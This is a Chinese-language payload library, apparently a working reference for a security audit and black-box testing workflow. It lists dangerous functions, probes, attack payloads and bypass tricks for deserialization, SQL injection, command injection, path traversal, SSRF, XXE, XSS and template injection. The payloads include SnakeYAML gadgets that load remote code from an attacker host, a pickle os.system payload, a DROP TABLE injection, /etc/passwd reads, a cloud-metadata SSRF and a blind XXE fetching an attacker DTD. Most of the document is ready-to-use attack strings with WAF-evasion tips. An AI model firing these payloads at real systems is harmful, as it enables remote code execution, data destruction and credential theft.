# Payload Library

各漏洞类型的关键字表、安全探针和攻击Payload。Step 3代码审计时用关键字表定位漏洞函数，Step 4黑盒验证时用对应payload。

## 1. 反序列化

### 代码关键字

| 语言 | 危险函数 |
|------|----------|
| Java | `new Yaml()`、`ObjectInputStream.readObject()`、`XMLDecoder.readObject()`、`SnakeYAML`无SafeConstructor |
| Python | `pickle.load()`、`yaml.load()`无Loader、`yaml.unsafe_load()`、`shelve.open()`、`torch.load(weights_only=False)` |
| Go | `gob.Decode()`、`json.Unmarshal` + 自定义Unmarshaler |
| Node.js | `eval()`、`Function()`、`serialize.unserialize()`、`node-serialize` |

### 安全探针

| 类型 | 探针 |
|------|------|
| SnakeYAML | `!!binary "dGVzdA=="` (安全标签，正常解析说明通道畅通) |
| Java ObjectInputStream | 发送正常序列化对象 |
| Python pickle | 发送正常pickle数据 |
| JSON反序列化 | 发送正常JSON字段 |

### 攻击Payload

**SnakeYAML（Java）** — 阶梯式递进：
```yaml
# P1: 简单类实例化（无副作用）
poc: !!java.net.URL ["http://callback.example.com/test"]
# P2: Spring RCE
poc: !!org.springframework.context.support.ClassPathXmlApplicationContext ["http://attacker/beans.xml"]
# P3: ScriptEngine RCE
poc: !!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[!!java.net.URL ["http://attacker/evil.jar"]]]]
```

**Python pickle**：
```python
import pickle, os, base64
class E:
    def __reduce__(self): return (os.system, ("id",))
print(base64.b64encode(pickle.dumps(E())).decode())
```

**Java ObjectInputStream** — ysoserial：
```bash
java -jar ysoserial.jar CommonsCollections6 "id" | base64 | tr -d '\n'
```

### Bypass技巧
- SnakeYAML: 尝试 `!<tag:yaml.org,2002:java.net.URL>` 完整URI格式
- SnakeYAML: 检查版本，1.x默认不安全，2.2+默认SafeConstructor
- pickle: 使用 `__reduce_ex__` 替代 `__reduce__`

---

## 2. SQL注入

### 代码关键字

| 语言 | 危险函数 |
|------|----------|
| Java | `Statement.execute(sql)`、`JdbcTemplate.query(sql)`字符串拼接、`.nativeQuery()` |
| Python | `cursor.execute(sql)`拼接、`.extra()`、`.raw()`、`text()` |
| Go | `db.Query(sql)`字符串拼接、`fmt.Sprintf`拼SQL |
| Node.js | `connection.query(sql)`拼接、knex raw |
| PHP | `mysqli_query()`、`PDO::query()`无参数化 |

### 安全探针
传入正常值：`1`（整数ID）、`test`（字符串）

### 攻击Payload
```
' OR 1=1--
" OR 1=1--
1' UNION SELECT null,version(),database()--
1; DROP TABLE test-- 
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
```

### Bypass技巧
- `SELECT` → `sElEcT` 大小写混合
- 空格 → `/**/`、`%09`、`%0a`
- 引号 → 双引号、反引号、十六进制编码
- WAF绕过：` /*!50000SELECT*/ `、等价函数 `IF()`→`CASE WHEN`

---

## 3. 命令注入

### 代码关键字

| 语言 | 危险函数 |
|------|----------|
| Java | `Runtime.exec()`、`ProcessBuilder` |
| Python | `os.system()`、`os.popen()`、`subprocess.call(shell=True)`、`eval()`、`exec()` |
| Go | `os/exec.Command()`、`exec.Command("sh", "-c", userInput)` |
| Node.js | `child_process.exec()`、`execSync()` |
| PHP | `system()`、`exec()`、`passthru()`、`shell_exec()`、反引号 |

### 安全探针
传入正常字符串参数

### 攻击Payload
```
; id
| id
$(id)
`id`
|| id
&& id
%0aid
```

### Bypass技巧
- 空格绕过：`$IFS`、`${IFS}`、`{cat,/etc/passwd}`、`<`
- 关键字绕过：`c'a't`、`c\at`、`/bin/c?t`
- 编码：`$(printf '\x69\x64')`、Base64解码执行

---

## 4. 路径遍历

### 代码关键字

| 语言 | 危险函数 |
|------|----------|
| Java | `new File(userInput)`、`Paths.get(base, user_input)` |
| Python | `open(user_input)`、`os.path.join(base, user_input)` |
| Go | `os.Open(userInput)`、`filepath.Join(base, userInput)` |
| Node.js | `fs.readFile(userInput)`、`path.join(base, userInput)` |
| PHP | `include()`、`require()`、`file_get_contents()` |

### 安全探针
传入正常文件名：`test.txt`、`README.md`

### 攻击Payload
```
../../../etc/passwd
....//....//....//etc/passwd
..%252f..%252f..%252fetc/passwd
/etc/passwd
..\..\..\windows\win.ini
```

### Bypass技巧
- URL编码双重：`%252f` → `%2f` → `/`
- Java: `..\\/` 混合分隔符
- 空字节：`../../../etc/passwd%00.jpg`（旧版本）

---

## 5. SSRF

### 代码关键字

| 语言 | 危险函数 |
|------|----------|
| Java | `URL.openStream()`、`HttpClient.execute()`、`WebClient`、`RestTemplate` |
| Python | `requests.get(url)`、`urllib.request.urlopen()`、`httpx.get()` |
| Go | `http.Get(url)`、`http.NewRequest()` |
| Node.js | `axios.get()`、`fetch()`、`http.get()` |
| PHP | `file_get_contents()`、`curl_exec()` |

### 安全探针
传入正常的业务URL

### 攻击Payload
```
http://169.254.169.254/latest/meta-data/
http://127.0.0.1:6379/INFO
file:///etc/passwd
dict://127.0.0.1:6379/INFO
gopher://127.0.0.1:6379/_*1%0d%0aINFO
http://[::1]:8080/
```

### Bypass技巧
- IP进制：`0x7f000001` = 127.0.0.1
- 短URL：https://t.cn/xxx
- DNS Rebinding
- 302跳转

---

## 6. XXE

### 代码关键字

| 语言 | 危险函数 |
|------|----------|
| Java | `DocumentBuilderFactory`无`setFeature`、`SAXParser`无禁用外部实体、`XMLInputFactory`无`setProperty` |
| Python | `lxml.etree.parse()`无`resolve_entities=False`、`xml.sax.parse()` |
| PHP | `simplexml_load_string()`无`LIBXML_NOENT`替代 |

### 安全探针
发送正常XML请求体

### 攻击Payload
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

Blind XXE（无回显）：
```xml
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker/evil.dtd">
  %dtd;
]>
```

### Bypass技巧
- UTF-16编码绕过WAF
- CDATA包装特殊字符
- 参数实体（`%`）绕过内部DTD限制

---

## 7. XSS

### 代码关键字

| 语言 | 危险函数 |
|------|----------|
| Java | `response.getWriter().write(userInput)`、`Model.addAttribute`无转义 |
| Python | `mark_safe()`、`|safe`过滤器、`autoescape=False` |
| Node.js | `innerHTML`、`v-html`、`dangerouslySetInnerHTML` |
| PHP | `echo $userInput`、无`htmlspecialchars()` |

### 安全探针
传入纯文本：`hello`

### 攻击Payload
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
javascript:alert(1)
```

### Bypass技巧
- 事件属性：`onerror`、`onload`、`onfocus`、`onmouseover`
- 编码：`&#x61;lert(1)`、`\\u0061lert(1)`
- 标签变体：`<ScRiPt>`、`<img/onerror=alert(1) src=x>`

---

## 8. SSTI（模板注入）

### 代码关键字
- Jinja2: `render_template_string(userInput)`
- Freemarker: `<#assign>` 用户可控
- Velocity: `$userData` 直接输出
- Thymeleaf: `th:text="__${userInput}__"`

### 安全探针
传入：`hello`

### 攻击Payload
```
{{7*7}}           # Jinja2/Twig
${7*7}            # Freemarker/Velocity/EL
<%= 7*7 %>        # ERB
#{7*7}            # Thymeleaf
{{config}}        # Flask config leak
{{''.__class__.__mro__[1].__subclasses__()}}  # Python RCE
```

---

## 版本核查命令

| 语言 | 命令 |
|------|------|
| Java/Maven | `mvn help:effective-pom -pl <module> 2>&1 \| grep -A1 <artifactId>` |
| Java/Gradle | `./gradlew dependencies \| grep <lib>` |
| Python | `pip show <package>` 或检查 `requirements.txt` |
| Go | `go list -m all \| grep <module>` |
| Node.js | `npm list <package>` 或检查 `package.json` |
